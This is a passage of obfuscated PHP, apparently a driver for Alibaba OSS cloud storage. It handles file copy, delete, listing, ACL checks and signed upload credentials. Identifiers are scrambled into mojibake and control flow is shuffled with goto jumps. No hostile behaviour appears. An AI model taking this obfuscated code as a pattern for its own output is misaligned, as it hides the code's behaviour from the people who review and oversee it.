($b‹Ãø¾Ö› as $F¨È—º¯Ø) { goto AÀ¥áÆ; bŠËÆñœí: $F…ÈŸÛ¼³ = $F¨È—º¯Ø->getLastModified(); $d‚Ãù¡†ä™ = $B«è²Ú™š¢ ? array($c‰¾§ĞÚ[28] => $BŒáµ¬ØÒ‡, $c‰¾§ĞÚ[78] => $bÜì‘¦Ìƒ, $c‰¾§ĞÚ[197] => strtotime($F…ÈŸÛ¼³)) : $BŒáµ¬ØÒ‡; $BÀœ÷Œ”Õ¬ = $bÜì‘¦Ìƒ == 0 && substr($BŒáµ¬ØÒ‡, strlen($BŒáµ¬ØÒ‡) - 1, 1) == $c‰¾§ĞÚ[8] ? !0 : !1; goto EóØ¯ñ£Ü÷; EóØ¯ñ£Ü÷: if ($f„ˆğÕ Íö) { $this->cacheMethod($c‰¾§ĞÚ[199], $BŒáµ¬ØÒ‡, $BÀœ÷Œ”Õ¬); $this->cacheMethod($c‰¾§ĞÚ[200], $BŒáµ¬ØÒ‡, array($c‰¾§ĞÚ[78] => $bÜì‘¦Ìƒ, $c‰¾§ĞÚ[1282] => $bÜì‘¦Ìƒ, $c‰¾§ĞÚ[84] => strtotime($F…ÈŸÛ¼³), $c‰¾§ĞÚ[1283] => $F…ÈŸÛ¼³)); } if ($BÀœ÷Œ”Õ¬) { $fÀĞ—İ—¶‡[] = $BŒáµ¬ØÒ‡; continue; } $aùª…Å‚º[] = $d‚Ãù¡†ä™; goto dÜ©å ‡‰; AÀ¥áÆ: if ($F¨È—º¯Ø->getKey() == $C®Ü‚±ƒÀÉ) { continue; } $BŒáµ¬ØÒ‡ = $F¨È—º¯Ø->getKey(); $bÜì‘¦Ìƒ = $F¨È—º¯Ø->getSize(); goto bŠËÆñœí; dÜ©å ‡‰: } foreach ($e‰ù†òßŠ½ as $FåŞ—êè¸å) { $fÀĞ—İ—¶‡[] = $FåŞ—êè¸å->getPrefix(); if ($f„ˆğÕ Íö) { $this->cacheMethod($c‰¾§ĞÚ[199], $BŒáµ¬ØÒ‡, !0); } } if ($A¿òÈ¥×Ù === $c‰¾§ĞÚ[33]) { break; } } if ($f„ˆğÕ Íö) { $this->cacheMethod($c‰¾§ĞÚ[199], $a¶áÌæˆµ, !0); } goto CÑšÂ µ; d‚ĞÀ¤Ãö: $c‰¾§ĞÚ =& $_SERVER[úÉ·öƒÑì©]; $a¶áÌæˆµ = trim($a¶áÌæˆµ, $c‰¾§ĞÚ[8]); $C®Ü‚±ƒÀÉ = empty($a¶áÌæˆµ) && $a¶áÌæˆµ !== $c‰¾§ĞÚ[191] ? $c‰¾§ĞÚ[33] : $a¶áÌæˆµ . $c‰¾§ĞÚ[8]; goto F–¥ƒ³®Š; BÆîÍË¸­î: } public function copyFile($d§¬¿çÁßª, $FÕ‰Øöó”) { $CãÖõ¡‹ğ  = $this->size($d§¬¿çÁßª); if ($CãÖõ¡‹ğ  < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $d§¬¿çÁßª, $this->bucket, $this->pathEncode($FÕ‰Øöó”)); } catch (OSS\Core\OssException $bÍœÊ‹âÒÁ) { return !1; } return $this->getPathOuter($FÕ‰Øöó”); } $F«à‡Èóš» = $this->multiCopyObject($d§¬¿çÁßª, $FÕ‰Øöó”, $CãÖõ¡‹ğ ); return $F«à‡Èóš» ? $this->getPathOuter($FÕ‰Øöó”) : !1; } private function multiCopyObject($DØ¨§ÜÖÎõ, $E•Ï†à İé, $bÃˆ­¯™˜ø) { $d¾ˆ¬ï­« =& $_SERVER[úÉ·öƒÑì©]; try { goto aè“ïÃ¶­ğ; aè“ïÃ¶­ğ: $FŞ§½âğè  = array(); if ($EŞà±Œğ­´ = $this->hashMd5($DØ¨§ÜÖÎõ)) { $FŞ§½âğè  = array(OSS\OssClient::OSS_HEADERS => array($d¾ˆ¬ï­«[1284] => $EŞà±Œğ­´)); } $aòËï×éê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E•Ï†à İé), $FŞ§½âğè ); goto dÒº²ˆÂ…À; b’ÄÕôñâ: $fˆ…µëÎ¹ = array(); foreach ($d³ˆ“îÉÜŞ as $e°‡²‡ÇŠ => $aìÆØ™½ğ¹) { $fˆ…µëÎ¹[] = array($d¾ˆ¬ï­«[1288] => $e°‡²‡ÇŠ + 1, $d¾ˆ¬ï­«[1289] => $aìÆØ™½ğ¹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($E•Ï†à İé), $aòËï×éê, $fˆ…µëÎ¹); goto d¡ÇàÁö‚¸; c¹¾–¸êóÈ: $eö¬¢ÛÊâë = 1024 * 1024 * 10; $fØ¶Â ä¥ = $this->client->generateMultiuploadParts($bÃˆ­¯™˜ø, $eö¬¢ÛÊâë); foreach ($fØ¶Â ä¥ as $e°‡²‡ÇŠ => $FÕƒÆÓ‚×ë) { $D³æ×Ÿ¾êà = $CÀªùÓçß + (int) $FÕƒÆÓ‚×ë[$d¾ˆ¬ï­«[1285]]; $b‰äë™®”¿ = (int) $FÕƒÆÓ‚×ë[$d¾ˆ¬ï­«[344]] + $D³æ×Ÿ¾êà - 1; $C‚À½‹ïÏ = array($d¾ˆ¬ï­«[1286] => $D³æ×Ÿ¾êà, $d¾ˆ¬ï­«[1287] => $b‰äë™®”¿); $d³ˆ“îÉÜŞ[] = $this->client->uploadPartCopy($this->bucket, $DØ¨§ÜÖÎõ, $this->bucket, $this->pathEncode($E•Ï†à İé), $Dãù¦¿åê», $aòËï×éê, $C‚À½‹ïÏ); $Dãù¦¿åê» = $Dãù¦¿åê» + 1; } goto b’ÄÕôñâ; dÒº²ˆÂ…À: $Dãù¦¿åê» = 1; $CÀªùÓçß = 0; $d³ˆ“îÉÜŞ = array(); goto c¹¾–¸êóÈ; d¡ÇàÁö‚¸: } catch (OSS\Core\OssException $e¿¸ŠÜ¨¯Ê) { return !1; } return !0; } public function moveFile($e…Æ’™±˜, $D‹„µ‹á…¶) { if ($this->copyFile($e…Æ’™±˜, $D‹„µ‹á…¶)) { $this->remove($e…Æ’™±˜); return $this->getPathOuter($D‹„µ‹á…¶); } return !1; } public function delFile($bùëÑ‡à´î) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bùëÑ‡à´î)); } catch (OSS\Core\OssException $C†›ÜÓµÁ») { return !1; } return !0; } public function delFolder($C»‚î´÷È) { goto f®°•ôµÔÆ; d‰ç³ç „: $BäŸÌ”Ø¶Ã = $this->delByBatch($aŠ´Ê³î¾Š[$A‚ÍÈ½šªñ[75]]); if (!$BäŸÌ”Ø¶Ã) { return !1; } return $this->delFile($f´µ—áª¬ã); goto FÙÖ‹¬—ç; eğÂ†ß«: if (!empty($C»‚î´÷È) && $C»‚î´÷È !== $A‚ÍÈ½šªñ[191] && !in_array($f´µ—áª¬ã, $aŠ´Ê³î¾Š[$A‚ÍÈ½šªñ[75]])) { $aŠ´Ê³î¾Š[$A‚ÍÈ½šªñ[75]][] = $f´µ—áª¬ã; } $BäŸÌ”Ø¶Ã = $this->delByBatch($aŠ´Ê³î¾Š[$A‚ÍÈ½šªñ[74]]); if (!$BäŸÌ”Ø¶Ã) { return !1; } goto d‰ç³ç „; Cèˆ¥¸å: $aŠ´Ê³î¾Š = $this->fileList($C»‚î´÷È); $this->listItemCache = !0; $f´µ—áª¬ã = trim($C»‚î´÷È, $A‚ÍÈ½šªñ[8]) . $A‚ÍÈ½šªñ[8]; goto eğÂ†ß«; f®°•ôµÔÆ: $A‚ÍÈ½šªñ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->exist($C»‚î´÷È)) { return !0; } $this->listItemCache = !1; goto Cèˆ¥¸å; FÙÖ‹¬—ç: } private function delByBatch($Fäªô†Êî) { foreach (array_chunk($Fäªô†Êî, 1000) as $cÂ…ÄãËœ) { try { $this->client->deleteObjects($this->bucket, $cÂ…ÄãËœ); } catch (OSS\Core\OssException $C£ÀšîŞÒ) { return !1; } } return !0; } public function rename($aï¡Öª·‰, $B«³Ç÷»ÏË) { return $this->renameObject($aï¡Öª·‰, $B«³Ç÷»ÏË); } private function fileInfo($cõßåØ‚›, $d¾×›§…áÀ = false, $b´°’˜İºé = array()) { goto b›Ñ‘Ÿê¨Š; b›Ñ‘Ÿê¨Š: $e„ˆéà†Êì =& $_SERVER[úÉ·öƒÑì©]; $F‹ãªŒºÓ = array($e„ˆéà†Êì[28] => $this->pathThis($cõßåØ‚›), $e„ˆéà†Êì[76] => $this->getPathOuter($cõßåØ‚›), $e„ˆéà†Êì[29] => $e„ˆéà†Êì[193], $e„ˆéà†Êì[78] => isset($b´°’˜İºé[$e„ˆéà†Êì[78]]) ? $b´°’˜İºé[$e„ˆéà†Êì[78]] : 0, $e„ˆéà†Êì[168] => $this->ext($cõßåØ‚›)); if ($d¾×›§…áÀ) { return $F‹ãªŒºÓ; } goto FÇ“×‰ä‰ë; FÇ“×‰ä‰ë: $F‹ãªŒºÓ[$e„ˆéà†Êì[194]] = $F‹ãªŒºÓ[$e„ˆéà†Êì[84]] = 0; $F‹ãªŒºÓ[$e„ˆéà†Êì[195]] = $F‹ãªŒºÓ[$e„ˆéà†Êì[196]] = !0; if (empty($b´°’˜İºé)) { $D‘á–ŠÆâ© = $this->objectMeta($cõßåØ‚›); if (!$D‘á–ŠÆâ©) { return $F‹ãªŒºÓ; } $b´°’˜İºé = array($e„ˆéà†Êì[84] => strtotime($D‘á–ŠÆâ©[$e„ˆéà†Êì[1283]]), $e„ˆéà†Êì[78] => $D‘á–ŠÆâ©[$e„ˆéà†Êì[1282]] + 0); } goto C­Æ—­ä‰; C™ ×Ğğ«: return $F‹ãªŒºÓ; goto BŠá˜³§¶; C­Æ—­ä‰: if (isset($b´°’˜İºé[$e„ˆéà†Êì[78]])) { $F‹ãªŒºÓ[$e„ˆéà†Êì[78]] = $b´°’˜İºé[$e„ˆéà†Êì[78]]; } if (isset($b´°’˜İºé[$e„ˆéà†Êì[84]])) { $F‹ãªŒºÓ[$e„ˆéà†Êì[84]] = $b´°’˜İºé[$e„ˆéà†Êì[84]]; } if (isset($b´°’˜İºé[$e„ˆéà†Êì[197]]) && !trim($F‹ãªŒºÓ[$e„ˆéà†Êì[84]])) { $F‹ãªŒºÓ[$e„ˆéà†Êì[84]] = $b´°’˜İºé[$e„ˆéà†Êì[197]]; } goto C™ ×Ğğ«; BŠá˜³§¶: } private function folderInfo($dÙàš¡óÜÕ, $fˆæÁ¨ = false, $d‰Œ¦„ñ« = array()) { goto BÖÑ¾Ñë‰Ù; C”¦â’Š¡×: $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[194]] = $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[84]] = 0; $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[195]] = $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[196]] = !0; if (empty($d‰Œ¦„ñ«)) { $dÙàš¡óÜÕ = rtrim($dÙàš¡óÜÕ, $e­ŸË™äÃ[8]) . $e­ŸË™äÃ[8]; $DÎèõÆÛÂ = $this->objectMeta($dÙàš¡óÜÕ); if (!$DÎèõÆÛÂ) { return $Aƒ—ÉŞº¾…; } $d‰Œ¦„ñ« = array($e­ŸË™äÃ[194] => $DÎèõÆÛÂ[$e­ŸË™äÃ[1290]][$e­ŸË™äÃ[1291]], $e­ŸË™äÃ[84] => strtotime($DÎèõÆÛÂ[$e­ŸË™äÃ[1283]])); } goto Dá‰·ØŒÜ; BÖÑ¾Ñë‰Ù: $e­ŸË™äÃ =& $_SERVER[úÉ·öƒÑì©]; $Aƒ—ÉŞº¾… = array($e­ŸË™äÃ[28] => $this->pathThis($dÙàš¡óÜÕ), $e­ŸË™äÃ[76] => $this->getPathOuter($e­ŸË™äÃ[8] . $dÙàš¡óÜÕ), $e­ŸË™äÃ[29] => $e­ŸË™äÃ[77]); if ($fˆæÁ¨) { return $Aƒ—ÉŞº¾…; } goto C”¦â’Š¡×; Dá‰·ØŒÜ: if (isset($d‰Œ¦„ñ«[$e­ŸË™äÃ[84]])) { $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[84]] = $d‰Œ¦„ñ«[$e­ŸË™äÃ[84]]; } if (isset($d‰Œ¦„ñ«[$e­ŸË™äÃ[194]])) { $Aƒ—ÉŞº¾…[$e­ŸË™äÃ[194]] = $d‰Œ¦„ñ«[$e­ŸË™äÃ[194]]; } return $Aƒ—ÉŞº¾…; goto fÎ‰¦“Àµ; fÎ‰¦“Àµ: } public function listPath($B•Ïõ´¯È, $A¢”ãôïé… = false) { $dé™›‰÷š¸ =& $_SERVER[úÉ·öƒÑì©]; $EŠèŞ•Âá = $this->fileList($B•Ïõ´¯È, $dé™›‰÷š¸[8], !0); foreach ($EŠèŞ•Âá[$dé™›‰÷š¸[75]] as $e²³î·æå => $fòÂ­íàç) { $EŠèŞ•Âá[$dé™›‰÷š¸[75]][$e²³î·æå] = $this->folderInfo($fòÂ­íàç, $A¢”ãôïé…, $fòÂ­íàç); } foreach ($EŠèŞ•Âá[$dé™›‰÷š¸[74]] as $e²³î·æå => $fòÂ­íàç) { $EŠèŞ•Âá[$dé™›‰÷š¸[74]][$e²³î·æå] = $this->fileInfo($fòÂ­íàç[$dé™›‰÷š¸[28]], $A¢”ãôïé…, $fòÂ­íàç); } return $EŠèŞ•Âá; } public function has($fòŞè›—Œ, $F‰·„®’ê = false, $EŠĞêÃÑ… = true) { goto Cáæ“¡š²–; Cáæ“¡š²–: $cÔ¹ÅôœÂ =& $_SERVER[úÉ·öƒÑì©]; $fòŞè›—Œ = trim($fòŞè›—Œ, $cÔ¹ÅôœÂ[8]); $B‘åÔê‡Œ» = empty($fòŞè›—Œ) && $fòŞè›—Œ !== $cÔ¹ÅôœÂ[191] ? $cÔ¹ÅôœÂ[33] : $fòŞè›—Œ . $cÔ¹ÅôœÂ[8]; goto dÉœŸ©èÀ…; E‹‚«èÈ: while (!0) { check_abort(); $EÕµ¿°äÃ = array($cÔ¹ÅôœÂ[1278] => $cÔ¹ÅôœÂ[8], $cÔ¹ÅôœÂ[1279] => $B‘åÔê‡Œ», $cÔ¹ÅôœÂ[1280] => $fÑ‹†³ƒµ, $cÔ¹ÅôœÂ[1281] => $B’ÕÙğÙ¨ ); try { $c†œóø³ßò = $this->client->listObjects($this->bucket, $EÕµ¿°äÃ); } catch (OSS\Core\OssException $BÍ˜ÔëÄñ) { break; } $B’ÕÙğÙ¨  = $c†œóø³ßò->getNextMarker(); $aáÎ„’ÖÈŒ = $c†œóø³ßò->getObjectList(); $a™­¦ôÌÖ¹ = $c†œóø³ßò->getPrefixList(); if ($F‰·„®’ê) { if (count($aáÎ„’ÖÈŒ) > 1 || count($aáÎ„’ÖÈŒ) == 1 && $aáÎ„’ÖÈŒ[0]->getKey() != $B‘åÔê‡Œ») { $CŠ—¶°¡¤Ä += count($aáÎ„’ÖÈŒ) - 1; } if (!empty($a™­¦ôÌÖ¹)) { $D´­ª« += count($a™­¦ôÌÖ¹); } if ($B’ÕÙğÙ¨  === $cÔ¹ÅôœÂ[33]) { break; } continue; } if ($EŠĞêÃÑ…) { if (!empty($aáÎ„’ÖÈŒ)) { if (count($aáÎ„’ÖÈŒ) > 1 || $aáÎ„’ÖÈŒ[0]->getKey() != $B‘åÔê‡Œ») { return !0; } } } else { if (!empty($a™­¦ôÌÖ¹)) { return !0; } } if ($B’ÕÙğÙ¨  === $cÔ¹ÅôœÂ[33]) { break; } } if ($F‰·„®’ê) { return array($cÔ¹ÅôœÂ[203] => $CŠ—¶°¡¤Ä, $cÔ¹ÅôœÂ[204] => $D´­ª«); } return !1; goto BšÖ®øÊÄì; dÉœŸ©èÀ…: $B’ÕÙğÙ¨  = $cÔ¹ÅôœÂ[33]; $fÑ‹†³ƒµ = 500; $CŠ—¶°¡¤Ä = $D´­ª« = 0; goto E‹‚«èÈ; BšÖ®øÊÄì: } public function listAll($fî™ì£ìùî) { $f©Œ”˜ºë =& $_SERVER[úÉ·öƒÑì©]; $b’ªğ–ÃŸ = $this->fileList($fî™ì£ìùî, $f©Œ”˜ºë[33], !0); $b„ÇÒ™¦öö = array(); foreach ($b’ªğ–ÃŸ[$f©Œ”˜ºë[74]] as $Bññ¬ºî½) { $b„ÇÒ™¦öö[$Bññ¬ºî½[$f©Œ”˜ºë[28]]] = $Bññ¬ºî½[$f©Œ”˜ºë[78]]; } foreach ($b’ªğ–ÃŸ[$f©Œ”˜ºë[75]] as $Bññ¬ºî½) { if (is_string($Bññ¬ºî½)) { $b„ÇÒ™¦öö[$Bññ¬ºî½] = 0; } } return $this->listAllFiles($fî™ì£ìùî, array_keys($b„ÇÒ™¦öö), $b„ÇÒ™¦öö); } public function canRead($cà½…ÕÉ¾†) { $fˆ‘ËÙÊ½ =& $_SERVER[úÉ·öƒÑì©]; $A‡ôÔßèºß = $this->pathAcl($cà½…ÕÉ¾†); return $A‡ôÔßèºß == $fˆ‘ËÙÊ½[1292] || $A‡ôÔßèºß == $fˆ‘ËÙÊ½[528] ? !0 : !1; } public function canWrite($f’«½«¹Ôí) { $d­°×Æ¤ğß = $this->pathAcl($f’«½«¹Ôí); return $d­°×Æ¤ğß == $_SERVER[úÉ·öƒÑì©][528] ? !0 : !1; } public function pathAcl($BŒ¯æ«‘) { goto FÁß¿õ–¼; eğÏªÇ¥‰°: $A–óÕ£ÔÇ = $dÄÕŒàº‹‚ == $Få”áù¢‘[34] ? $this->bucketAcl : $dÄÕŒàº‹‚; if ($A–óÕ£ÔÇ == $Få”áù¢‘[1293]) { return $Få”áù¢‘[1292]; } if ($A–óÕ£ÔÇ == $Få”áù¢‘[1294]) { return $Få”áù¢‘[528]; } goto C÷†•¾é£Á; FÁß¿õ–¼: $Få”áù¢‘ =& $_SERVER[úÉ·öƒÑì©]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $dÄÕŒàº‹‚ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($BŒ¯æ«‘)); } catch (OSS\Core\OssException $DğºÎ®Øµ) { return !1; } goto eğÏªÇ¥‰°; C÷†•¾é£Á: return $A–óÕ£ÔÇ; goto e ´ ô‡¯Ï; e ´ ô‡¯Ï: } private function chmodPath($FÃ÷Ñ•‚í£, $eö¸ğœä² = '') { $B…‰ì£¡š» =& $_SERVER[úÉ·öƒÑì©]; $E˜ùùÑ´‹ = empty($eö¸ğœä²) ? $B…‰ì£¡š»[1294] : $eö¸ğœä²; $Déô‡óÁ = array($B…‰ì£¡š»[34], $B…‰ì£¡š»[192], $B…‰ì£¡š»[1293], $B…‰ì£¡š»[1294]); if (!in_array($E˜ùùÑ´‹, $Déô‡óÁ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($FÃ÷Ñ•‚í£), $E˜ùùÑ´‹); } catch (OSS\Core\OssException $fãæÑ…ŒÜ) { return !1; } return !0; } public function getContent($fõöç…·ğÛ) { return $this->fileSubstr($fõöç…·ğÛ, -1); } public function setContent($e«Â­æ†ôì, $d‘°­‹¡áù = '') { $cŒ¨åÔ×„¾ =& $_SERVER[úÉ·öƒÑì©]; try { $cïõè±£· = $this->trafficLimit($cŒ¨åÔ×„¾[1295]); $d†–Œ²±£ = $this->client->putObject($this->bucket, $this->pathEncode($e«Â­æ†ôì), $d‘°­‹¡áù, $cïõè±£·); } catch (OSS\Core\OssException $DÑÊõó…ŒÖ) { return !1; } $aêì˜—´Ï­ = array($cŒ¨åÔ×„¾[1284] => trim($d†–Œ²±£[$cŒ¨åÔ×„¾[1296]], $cŒ¨åÔ×„¾[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e«Â­æ†ôì))); $this->updateObjMeta($e«Â­æ†ôì, $aêì˜—´Ï­); return isset($d†–Œ²±£[$cŒ¨åÔ×„¾[1297]][$cŒ¨åÔ×„¾[1243]]) ? !0 : !1; } private function updateObjMeta($fò‚İ…î£ã, $d™“öÊ³ÑÙ) { $fò‚İ…î£ã = $this->pathEncode($fò‚İ…î£ã); try { $e¦äŠñéÍ = array(OSS\OssClient::OSS_HEADERS => $d™“öÊ³ÑÙ); $this->client->copyObject($this->bucket, $fò‚İ…î£ã, $this->bucket, $fò‚İ…î£ã, $e¦äŠñéÍ); } catch (OSS\Core\OssException $Cî³•ÅïŞ) { return !1; } return !0; } public function upload($bÔ™­ËõÃÆ, $a©½ãˆ…ª¯, $DíÄòêçŸ¦ = false, $CğßÉš˜È– = REPEAT_REPLACE) { $EÜôŠ„ÖÑÁ =& $_SERVER[úÉ·öƒÑì©]; $fƒ«Œ«¶ = trim($bÔ™­ËõÃÆ, $EÜôŠ„ÖÑÁ[8]); $fã›ª«ã†± = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($EÜôŠ„ÖÑÁ[1284] => @md5_file($a©½ãˆ…ª¯)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bÔ™­ËõÃÆ))); $fã›ª«ã†± = $this->trafficLimit($EÜôŠ„ÖÑÁ[1295], $fã›ª«ã†±); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($fƒ«Œ«¶), $a©½ãˆ…ª¯, $fã›ª«ã†±); } catch (OSS\Core\OssException $f¨ê±½ÒğÀ) { return !1; } return $this->getPathOuter($bÔ™­ËõÃÆ); } public function getHost() { $cè•Ê„ì… =& $_SERVER[úÉ·öƒÑì©]; $CÜ£Ü£‚¢¾ = explode($cè•Ê„ì…[177], parent::getHost()); return $CÜ£Ü£‚¢¾[0] . $cè•Ê„ì…[177] . $this->bucket . $cè•Ê„ì…[95] . $CÜ£Ü£‚¢¾[1]; } public function uploadFormData($AŞ®®ê¿, $cîºÕ¬‚µ¡ = 3600) { goto FëÁ±±Š¯; B×Ê¼±ÚåÕ: $D¬ù³–¦ğ = strpos($Eã·ÊêìÂ, $EåÁÎìŠ²¦[303]); $Eã·ÊêìÂ = substr($Eã·ÊêìÂ, 0, $D¬ù³–¦ğ) . $EåÁÎìŠ²¦[1299]; $f‰á‡ŸïÀ¼ = 1048576000 * 5; goto Bç„ºïî¹ö; eôë‘ÀøõÓ: $Bª¹‘ìƒ÷è = base64_encode(hash_hmac($EåÁÎìŠ²¦[230], $b–ö¨Éíß, $this->secret, !0)); $DÑ£›Øöè† = array($EåÁÎìŠ²¦[1208] => $b–ö¨Éíß, $EåÁÎìŠ²¦[1301] => $this->accessKey, $EåÁÎìŠ²¦[1204] => $EåÁÎìŠ²¦[1196], $EåÁÎìŠ²¦[1302] => $Bª¹‘ìƒ÷è, $EåÁÎìŠ²¦[175] => $BÙ‚òÌÍ™); $DÑ£›Øöè† = $this->trafficLimit($EåÁÎìŠ²¦[1295], $DÑ£›Øöè†); goto fÃ¼Ñƒº¦è; fÃ¼Ñƒº¦è: return $DÑ£›Øöè†; goto EŞ×Ÿ¶Å; FëÁ±±Š¯: $EåÁÎìŠ²¦ =& $_SERVER[úÉ·öƒÑì©]; if (!($BÙ‚òÌÍ™ = $this->getHost())) { return !1; } $bİÏ¶ğ¿Õˆ = $cîºÕ¬‚µ¡; goto F¨‹„Šçê±; Bç„ºïî¹ö: $E´¼™ÈïŒ = $this->pathFather($AŞ®®ê¿); $cÚáŞôÇÆ“ = array($EåÁÎìŠ²¦[1198] => $Eã·ÊêìÂ, $EåÁÎìŠ²¦[1199] => array(array($EåÁÎìŠ²¦[1300], 0, $f‰á‡ŸïÀ¼), array($EåÁÎìŠ²¦[1202], $EåÁÎìŠ²¦[1203], $E´¼™ÈïŒ))); $b–ö¨Éíß = base64_encode(json_encode($cÚáŞôÇÆ“)); goto eôë‘ÀøõÓ; F¨‹„Šçê±: $E¬‘ó°£Ê = date($EåÁÎìŠ²¦[1298], time() + $bİÏ¶ğ¿Õˆ); $FÌïÎ§ÑìÊ = new DateTime($E¬‘ó°£Ê); $Eã·ÊêìÂ = $FÌïÎ§ÑìÊ->format(DateTime::ISO8601); goto B×Ê¼±ÚåÕ; EŞ×Ÿ¶Å: } public function multiUploadFormData($B’˜¢©…Ñ, $Aİ»ÃˆÚ§£ = 3600) { $F÷œØ ¢ñ³ =& $_SERVER[úÉ·öƒÑì©]; if (!($f•éïÅªÁ÷ = $this->getHost())) { return !1; } $AÔæÏïÏŞª = $this->trafficLimit($F÷œØ ¢ñ³[1295]); $aÇ×Œ‰œ§á = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B’˜¢©…Ñ), $AÔæÏïÏŞª); return array($F÷œØ ¢ñ³[221] => $aÇ×Œ‰œ§á, $F÷œØ ¢ñ³[175] => $f•éïÅªÁ÷ . $F÷œØ ¢ñ³[8] . $this->pathEncode($B’˜¢©…Ñ), $F÷œØ ¢ñ³[222] => gmdate($F÷œØ ¢ñ³[1303]), $F÷œØ ¢ñ³[93] => $B’˜¢©…Ñ); } public function multiUploadAuthData($c”ƒ‘·åèğ, $DŸÌÜ¿á¨ª = array()) { goto E’Èæñ¶¾; E’Èæñ¶¾: $B×Õè¶áËÚ =& $_SERVER[úÉ·öƒÑì©]; $dÒºöŠ›ç¿ = isset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[222]]) ? $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[222]] : gmdate($B×Õè¶áËÚ[1303]); $cÒóĞí˜Ü = isset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[168]]) ? $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[168]] : $B×Õè¶áËÚ[33]; goto cßå»¯Í¶; EäÚ‡‡¶•: if (!empty($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[1305]])) { $CÆ„®‰²”É = array_merge(array($Bëª´Æ‚Ã‘[4]), $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[1305]]); sort($CÆ„®‰²”É); $Bëª´Æ‚Ã‘[4] = implode($B×Õè¶áËÚ[229], $CÆ„®‰²”É); } $AÜ¯…·Õà¨ = implode($B×Õè¶áËÚ[229], $Bëª´Æ‚Ã‘); $FÂ×È½ïÁ« = base64_encode(hash_hmac($B×Õè¶áËÚ[230], $AÜ¯…·Õà¨, $this->secret, !0)); goto B‰ÂÄ•Œ—; eî…Â¤ôİî: $Bëª´Æ‚Ã‘ = array($B×Õè¶áËÚ[224], $B×Õè¶áËÚ[33], $B×Õè¶áËÚ[119], $dÒºöŠ›ç¿, "\170\x2d\157\163\163\55\144\x61\x74\x65\72{$dÒºöŠ›ç¿}", $B×Õè¶áËÚ[8] . $this->bucket . $B×Õè¶áËÚ[8] . $d†ÉÈ²¨œŞ . $cÒóĞí˜Ü); if (strpos($cÒóĞí˜Ü, $B×Õè¶áËÚ[225]) === 0) { $Bëª´Æ‚Ã‘[0] = $B×Õè¶áËÚ[226]; if ($cÎŒ¨ÍåÎø = $this->trafficLimit($B×Õè¶áËÚ[1295])) { $d†ÉÈ²¨œŞ = $B×Õè¶áËÚ[1304]; array_splice($Bëª´Æ‚Ã‘, 5, 0, $d†ÉÈ²¨œŞ . $B×Õè¶áËÚ[4] . $cÎŒ¨ÍåÎø[$d†ÉÈ²¨œŞ]); } } if (isset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[227]]) && $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[227]] == $B×Õè¶áËÚ[228]) { $Bëª´Æ‚Ã‘[0] = $B×Õè¶áËÚ[228]; } goto EäÚ‡‡¶•; B‰ÂÄ•Œ—: $d—¹›’Ã = $B×Õè¶áËÚ[1268] . $this->accessKey . $B×Õè¶áËÚ[4] . $FÂ×È½ïÁ«; if (strpos($cÒóĞí˜Ü, $B×Õè¶áËÚ[225]) === 0) { $d—¹›’Ã = array($B×Õè¶áËÚ[232] => $d—¹›’Ã, $B×Õè¶áËÚ[222] => $dÒºöŠ›ç¿); if ($cÎŒ¨ÍåÎø) { $d—¹›’Ã = array_merge($d—¹›’Ã, $cÎŒ¨ÍåÎø); } } return $d—¹›’Ã; goto cÚğğ²İôâ; cßå»¯Í¶: $d†ÉÈ²¨œŞ = $c”ƒ‘·åèğ; if (isset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[93]])) { $d†ÉÈ²¨œŞ = $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[93]]; unset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[93]]); } if (isset($DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[223]])) { $DŸÌÜ¿á¨ª[$B×Õè¶áËÚ[222]] = $dÒºöŠ›ç¿; return $this->listUploadParts($d†ÉÈ²¨œŞ, $DŸÌÜ¿á¨ª); } goto eî…Â¤ôİî; cÚğğ²İôâ: } public function listUploadParts($e›ëì†ÕÄ, $A¤³êÀÖœÆ) { goto Eõ™—ğÌğÄ; FÑß‘¬õ•«: unset($A¤³êÀÖœÆ[$díË£Œ¯ª[223]], $A¤³êÀÖœÆ[$díË£Œ¯ª[227]]); $eÕí–«ğÕÖ = $this->multiUploadAuthData($e›ëì†ÕÄ, $A¤³êÀÖœÆ); if (empty($eÕí–«ğÕÖ)) { return !1; } goto CÃª„çØÏ ; CÃª„çØÏ : return array($díË£Œ¯ª[232] => $eÕí–«ğÕÖ, $díË£Œ¯ª[222] => $A¤³êÀÖœÆ[$díË£Œ¯ª[222]], $díË£Œ¯ª[234] => $BÑï¶ÇÃÌœ); goto b®ëÅå¬šù; Eõ™—ğÌğÄ: $díË£Œ¯ª =& $_SERVER[úÉ·öƒÑì©]; $e±¥ö†Ò÷¹ = parse_url_query($A¤³êÀÖœÆ[$díË£Œ¯ª[168]]); $eª·ˆÌ¯ìõ = $this->client->listParts($this->bucket, $this->pathEncode($e›ëì†ÕÄ), $e±¥ö†Ò÷¹[$díË£Œ¯ª[221]]); goto 